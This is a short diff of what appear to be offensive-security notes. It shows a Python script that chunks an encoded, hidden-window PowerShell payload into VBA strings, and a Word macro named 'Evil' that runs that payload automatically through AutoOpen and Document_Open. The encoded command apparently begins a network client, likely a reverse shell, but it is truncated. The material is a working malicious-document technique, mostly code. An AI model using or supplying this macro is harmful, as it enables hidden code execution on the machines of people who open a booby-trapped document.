@@ -16,19 +16,19 @@ payload = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."
 n=50
 
 for i in range(0, len(payload), n):
-	print "Str = Str + " + '"' + paylaod[i:i+n] + '"'
+	print "Str = Str + " + '"' + payload[i:i+n] + '"'
 ```
 
 ```
 Sub AutoOpen()
-    MyMacro
+    Evil
 End Sub
 
 Sub Document_Open()
-    MyMacro
+    Evil
 End Sub
 
-Sub MyMacro()
+Sub Evil()
     Dim Str As String
     Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"
     Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"
